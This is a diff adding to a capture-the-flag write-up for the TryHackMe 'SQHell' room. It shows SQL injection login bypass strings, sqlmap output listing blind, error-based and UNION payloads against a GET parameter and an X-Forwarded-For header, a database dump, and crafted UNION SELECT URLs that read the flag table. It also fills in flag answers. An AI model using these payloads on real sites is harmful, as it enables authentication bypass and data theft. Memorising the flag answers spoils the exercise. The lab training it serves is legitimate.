@@ -25,7 +25,7 @@ Hint: Unless displayed on the page the flags are stored in the flag table in the
 <h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
 
 > 1.1. <em>Flag 1</em><a id='1.1'></a>
->> <code><strong>__________</strong></code><br>
+>> <code><strong>THM{FLAG1:E786483E5A53075750F1FA792E823BD2}</strong></code><br>
 
 <br>
 
@@ -40,12 +40,12 @@ Hint: Unless displayed on the page the flags are stored in the flag table in the
 <br>
 
 > 1.4. <em>Flag 4</em>Hint : <em>Well, dreams, they feel real while we're in them right?</em><a id='1.4'></a>
->> <code><strong>T__________</strong></code><br>
+>> <code><strong>THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}</strong></code><br>
 
 <br>
 
 > 1.5. <em>Flag 5</em><a id='1.5'></a>
->> <code><strong>___________</strong></code><br>
+>> <code><strong>THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}</strong></code><br>
 
 <br>
 <br>
@@ -236,8 +236,249 @@ Finished
 <h3>-------- <code>http://TargetIP/login</code> ---------</h3>
 
 
-<h3>-------- curl ---------</h3>
-
-
 ![image](https://github.com/user-attachments/assets/e77b5e17-671e-4036-a7ff-e8c2772b3b26)
+
+
+<h3>-------- <code>http://TargetIP/login</code> ---------</h3>
+
+<p>Tried <code>' or 1=1 #</code>:<code>*****</code></p> and discovered the first flag.</p>
+
+![image](https://github.com/user-attachments/assets/985f2901-9092-4054-b28b-3f4567cb334e)
+
+<br>
+
+<p>Tried also <code>' OR 1=1-- -</code>:<code>*****</code></p> and it also leads to the first flag.
+
+<br>
+
+![image](https://github.com/user-attachments/assets/6c4de1b1-0424-4cc7-8a27-101912b4e52f)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/d16d6d4e-9f19-4877-bac7-e02f11234233)
+
+
+<br>
+
+
+<h3>-------------------------------------------------------</h3>
+
+<br>
+<br>
+
+<h3>-------- <code>http://TargetIP/terms-and-conditions</code> ---------</h3>
+
+![image](https://github.com/user-attachments/assets/0292790b-61bf-4875-ba2f-4082cab77d94)
+
+<br>
+
+<p>
+Terms and Conditions<br>
+
+We only have a few small terms:<br>
+
+i: We own the soul of any visitors<br>
+
+ii: We can't be blamed for any security breaches<br>
+
+iii: We log your IP address for analytics purposes<br>
+</p>
+
+<br>
+
+<h3>-------- <code>Burp Suite</code> and <code>FoxyProxy</code> ---------</h3>
+
+<p>Saved the login request as <code>req</code>.</p>
+
+![image](https://github.com/user-attachments/assets/c892a5f1-d016-4a5d-9ddd-ae2c06c52dc1)
+
+<br>
+
+
+<br>
+
+<h3>-------- <code>IP address for analytics purposes</code>:<code>Specific Headers</code> ---------</h3>
+
+<p>Used <code>headers.txt</code> wordlist.</p>
+
+<br>
+
+```bash
+:~/SQHell# ls
+req
+:~/SQHell# sqlmap -u "http://TargetIP/post?id=2" --dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+...
+[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
+...
+[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+...
+[INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+...
+[INFO] target URL appears to have 4 columns in query
+...
+[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable.
+...
+GET parameter 'id' is vulnerable.
+...
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 7190=7190
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=2 AND EXTRACTVALUE(3683,CONCAT(0x5c,0x71766a7171,(SELECT (ELT(3683=3683,1))),0x717a717071))
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=2;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 6269 FROM (SELECT(SLEEP(5)))pcPu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-3279 UNION ALL SELECT NULL,NULL,CONCAT(0x71766a7171,0x797a5a4d55586466716748517977796a636f7359655a46646b5a4b714c56466a4857726272576f68,0x717a717071),NULL-- -
+
+...
+[INFO] the back-end DBMS is MySQL
+...
+[INFO] retrieved: 'information_schema'
+...
+
+[INFO] retrieved: 'sqhell_5'
+available databases [2]:                                                                                           
+[*] information_schema
+[*] sqhell_5
+...
+[INFO] fetched data logged to text files under '/root/.sqlmap/output/TargetIP'
+```
+
+<br>
+
+```bash
+:~/SQHell# sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://TargetIP/
+...
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[...] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-forwarded-for #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 1' AND (SELECT 5385 FROM (SELECT(SLEEP(5)))XLir) AND 'uMCO'='uMCO
+```
+
+<br>
+
+```bash
+
+:~/SQHell# sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://TargetIP/ -D sqhell_5 --dump
+...
+
+[INFO] fetched data logged to text files under '/root/.sqlmap/output/TargetIP
+
+```
+
+<br>
+
+
+
+```bash
+:~/.sqlmap/output/TargetIP# cat log
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 7190=7190
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=2 AND EXTRACTVALUE(3683,CONCAT(0x5c,0x71766a7171,(SELECT (ELT(3683=3683,1))),0x717a717071))
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=2;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 6269 FROM (SELECT(SLEEP(5)))pcPu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-3279 UNION ALL SELECT NULL,NULL,CONCAT(0x71766a7171,0x797a5a4d55586466716748517977796a636f7359655a46646b5a4b714c56466a4857726272576f68,0x717a717071),NULL-- -
+---
+back-end DBMS: MySQL >= 5.1
+available databases [2]:
+[*] information_schema
+[*] sqhell_5
+
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: X-forwarded-for #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 1' AND (SELECT 5385 FROM (SELECT(SLEEP(5)))XLir) AND 'uMCO'='uMCO
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-forwarded-for #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 1' AND (SELECT 5385 FROM (SELECT(SLEEP(5)))XLir) AND 'uMCO'='uMCO
+---
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-forwarded-for #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 1' AND (SELECT 5385 FROM (SELECT(SLEEP(5)))XLir) AND 'uMCO'='uMCO
+---
+back-end DBMS: MySQL >= 8.0.0
+
+
+```
+
+
+<br>
+
+
+```bash
+http://TargetIP/user?id=2%20union%20select%20%221%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-
+
+```
+
+![image](https://github.com/user-attachments/assets/04ed1574-fd33-44c8-b9c3-4bd81cf0c3de)
+
+
+
+```bash
+http://TargetIP/post?id=1%20and%201=2%20union%20select%201,flag,3,4%20from%20sqhell_5.flag;--%20-
+```
+
+![image](https://github.com/user-attachments/assets/6b17ee85-3bb7-4b61-9a01-25165d1dba84)
+
+
+
+
+```bash
+
+http://TargetIP/user?id=2%20union%20all%20select%20%221%20union%20select%201,flag,4,5%20from%20flag%20--%20-%22,1,2%20from%20users#
+```
+
+![image](https://github.com/user-attachments/assets/40fb484c-b54a-48ae-92ce-18c7aee2fdce)
+
 
